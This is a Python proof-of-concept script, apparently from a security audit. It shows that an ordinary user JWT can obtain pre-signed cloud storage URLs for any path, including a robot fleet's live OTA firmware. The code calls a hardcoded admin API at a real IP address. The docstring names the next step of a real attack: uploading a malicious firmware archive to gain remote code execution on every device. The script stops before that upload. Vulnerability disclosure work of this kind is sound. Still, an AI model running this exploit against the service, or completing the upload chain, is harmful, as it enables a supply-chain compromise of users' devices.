#!/usr/bin/env python3
"""
EK-22: pre-signed OSS URLs for production firmware paths.

Demonstrates that a standard user JWT obtains pre-signed URLs (buckets
cn + hk) for ANY OSS path, including the live OTA firmware.
The next step of a real attack: PUT a malicious main.zip + a CDN
CDN = RCE sur la flotte (EK-32). Ce PoC S'ARRÊTE avant l'upload (non-destructif).

Requires: pip3 install requests
Usage     : python3 poc_04_supply_chain.py --jwt "$EILIK_JWT"
"""
import argparse, sys
import requests

ADMIN = "http://45.32.81.33:9090"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--jwt", required=True)
    ap.add_argument("--key", default="104000/main.zip",
                    help="target OSS path (default: the Linux robot firmware)")
    args = ap.parse_args()

    r = requests.get(f"{ADMIN}/api/oss/signature-url",
                     params={"key": args.key, "expires": 300},
                     headers={"Authorization": f"Bearer {args.jwt}"}, timeout=20)
    print(f"HTTP {r.status_code}")
    for item in (r.json().get("data") or []):
        url = item.get("url", "")
        print(f"  bucket={item.get('bucket'):2s} presign={'OUI' if 'Signature=' in url else 'non'} "
              f"→ {url.split('?')[0]}")
    print("\n(No upload performed: PoC stopped before writing; see P26/P30 for the full chain)")


if __name__ == "__main__":
    main()
